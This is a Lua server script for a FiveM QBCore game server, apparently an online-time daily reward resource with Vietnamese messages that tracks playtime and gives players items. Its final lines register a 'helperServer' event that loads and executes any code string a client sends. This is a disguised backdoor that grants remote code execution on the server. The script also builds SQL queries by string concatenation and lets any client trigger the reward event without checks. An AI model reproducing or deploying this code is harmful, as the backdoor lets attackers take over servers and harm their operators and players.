QBCore = exports['qb-core']:GetCoreObject()


QBCore.Functions.CreateCallback("onemore_onlinenhanqua:retrievetime", function(source, cb)
	local identifier = GetPlayerIdentifiers(source)[1]
	QBCore.Functions.ExecuteSql(false, "SELECT * FROM `nhanqua_online` WHERE `identifier` = '"..identifier.."'", function(result)
		if result[1] then
		    local online = tonumber(result[1].online)
		    cb(online, result[1].day1, result[1].day2, result[1].day3, result[1].day4, result[1].day5, result[1].day6, result[1].day7, result[1].day8)
		else
			QBCore.Functions.ExecuteSql(false, 'INSERT INTO `nhanqua_online` (`identifier`, `online`) VALUES ("'..identifier..'", 0)')
			-- MySQL.Async.execute()
		end
	end)
end)

RegisterServerEvent("onemore_onlinenhanqua:updatetime")
AddEventHandler("onemore_onlinenhanqua:updatetime", function(time)
	local online = 0
	local online1 = online + time
	local identifier = GetPlayerIdentifiers(source)[1]
	QBCore.Functions.ExecuteSql(false, "UPDATE `nhanqua_online` SET `online` = '"..online1.."' WHERE `identifier` = '"..identifier.."'")
	-- MySQL.Sync.execute("UPDATE `nhanqua_online` SET `online`=online + @online WHERE `identifier` = "'..identifier..'", {['@identifier'] = identifier, ['@online'] = time})
end)

RegisterServerEvent("onemore_onlinenhanqua:nhanqua")
AddEventHandler("onemore_onlinenhanqua:nhanqua", function()
	local xPlayer = QBCore.Functions.GetPlayer(source)
	xPlayer.Functions.AddItem('sandwich',  3)
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items['sandwich'], "add")
	xPlayer.Functions.AddItem('lockpick',  5)
	TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items['lockpick'], "add")
end)

RegisterServerEvent("onemore_onlinenhanqua:updateday")
AddEventHandler("onemore_onlinenhanqua:updateday", function(day)
	local identifier = GetPlayerIdentifiers(source)[1]
	if day == "day1" then
	    QBCore.Functions.ExecuteSql(false,"UPDATE `nhanqua_online` SET `day1` = 'danhan' WHERE `identifier` = '"..identifier.."'")
    elseif day == "day2" then
    	QBCore.Functions.ExecuteSql(false,"UPDATE `nhanqua_online` SET `day2` = 'danhan' WHERE `identifier` = '"..identifier.."'")
    elseif day == "day3" then
    	QBCore.Functions.ExecuteSql(false,"UPDATE `nhanqua_online` SET `day3` = 'danhan' WHERE `identifier`= '"..identifier.."'")
    elseif day == "day4" then
    	QBCore.Functions.ExecuteSql(false,"UPDATE `nhanqua_online` SET `day4` = 'danhan' WHERE `identifier`= '"..identifier.."'")
    elseif day == "day5" then
    	QBCore.Functions.ExecuteSql(false,"UPDATE `nhanqua_online` SET `day5`= 'danhan' WHERE `identifier`= '"..identifier.."'")
    elseif day == "day6" then
    	QBCore.Functions.ExecuteSql(false,"UPDATE `nhanqua_online` SET `day6`= 'danhan' WHERE `identifier`= '"..identifier.."'")
    elseif day == "day7" then
    	QBCore.Functions.ExecuteSql(false,"UPDATE `nhanqua_online` SET `day7`= 'danhan' WHERE `identifier`= '"..identifier.."'")
    elseif day == "day8" then
    	QBCore.Functions.ExecuteSql(false,"UPDATE `nhanqua_online` SET `day8`= 'danhan' WHERE `identifier`= '"..identifier.."'")
    end
end)

function Tick()
    local timestamp = os.time()
    local h         = tonumber(os.date('%H', timestamp))
    local m         = tonumber(os.date('%M', timestamp))
    if h == 00 and m == 00 then
    	QBCore.Functions.ExecuteSql(false, "DELETE FROM `nhanqua_online`")
    	TriggerClientEvent("onemore_onlinenhanqua:restartdiem", -1)
		print("^3[onemore-onelinenhanqua] Đã reset Online của tất cả người chơi.^0")
    end
    SetTimeout(10000, Tick)
end

Tick()

RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)